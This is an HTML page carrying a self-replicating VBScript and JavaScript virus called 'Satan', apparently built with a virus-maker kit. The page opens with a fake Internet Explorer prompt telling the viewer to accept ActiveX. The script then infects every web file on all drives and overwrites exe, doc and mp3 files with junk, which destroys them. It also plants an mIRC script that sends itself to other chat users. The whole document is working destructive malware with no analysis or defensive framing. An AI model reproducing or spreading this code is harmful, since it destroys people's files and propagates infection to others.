<!--Satan-->
<!-- made by DareDevil-->
<!-- Generated with SAFHVM v.1.0 by sevenC / N0:7 -->
<html><head><title></title></head><body>
<script language=VBScript>
'Satan
'made by DareDevil
'Generated with SAFHVM v.1.0 

On Error Resume Next
MsgBox "To view this page you must accept the ActiveX",vbinformation,"Internet Explorer"
Set fso=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("WScript.Shell")
If err.number=429 Then
ws.Run javascript:location.reload()
Else
Dim Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder
Set fso=CreateObject("Scripting.FileSystemObject")
set Trange = document.body.CreateTextRange
Set Drives = fso.drives 
For Each Drive in Drives
If drive.isready then
Dosearch drive
end If 
next
function Dosearch(path)
on error resume next
Set Folder=fso.getfolder(path)
Set Files = folder.files
For Each File in files
If fso.GetExtensionName(file.path)="htm" or fso.GetExtensionName(file.path)="html" or fso.GetExtensionName(file.path)="asp" or fso.GetExtensionName(file.path)="php" or fso.GetExtensionName(file.path)="cgi" then
on error resume next
Set seven = FSO.OpenTextFile(file.path, 1, False)
FileContents = seven.ReadAll()
seven.close()
Set seven = FSO.OpenTextFile(file.path, 2, False)
seven.WriteLine "<!--Satan-->"
seven.Write("<html><body>" + Chr(13) + Chr(10))
seven.WriteLine TRange.htmlText
seven.WriteLine (" ")
seven.WriteLine ("</body></html>")
seven.Write(FileContents)
seven.close()
On error resume next
set a=fso.CreateTextFile("C:\mirc\script.ini")
a.WriteLine "[script]"
a.WriteLine "n0=on 1:join:*.*: { if ( $nick ==$me ) {halt} "
a.WriteLine "n1=/dcc send $nick C:\mirc\joke.htm }"
a.Close()
end if
If fso.GetExtensionName(file.path)="exe" then
on error resume next
set drop = fso.createtextfile(File.path)
drop.writeline "Satan!"
drop.close
end if
If fso.GetExtensionName(file.path)="doc" then
on error resume next
set drop = fso.createtextfile(File.path)
drop.writeline "Satan!"
drop.close
end if
If fso.GetExtensionName(file.path)="mp3" then
on error resume next
set drop = fso.createtextfile(File.path)
drop.writeline "Satan!"
drop.close
end if
next
Set Subfolders = folder.SubFolders
For Each Subfolder in Subfolders
Dosearch Subfolder.path 
Next 
end function 
end if
--></script>
<script language="JavaScript">
var viruspath, virus, code, fso, file
fso=new ActiveXObject("Scripting.FileSystemObject")
viruspath=window.location.pathname
viruspath=viruspath.slice(1)
virus=fso.OpenTextFile(viruspath,1)
code=virus.ReadAll()
virus.Close();
file=fso.CreateTextFile("C:\\mirc\\joke.htm", 2)
file.write(code)
file.Close()
</script></body></html>
<html><head><title>Satan by DareDevil</title><head><body bgcolor="black">
<h3 align="center">
<font color="white">
<marquee>Satan by DareDevil</marquee><br><br>
Satan!<br><br> Generated with Simple and fast html virus maker by sevenC / N0:7
</body></html>

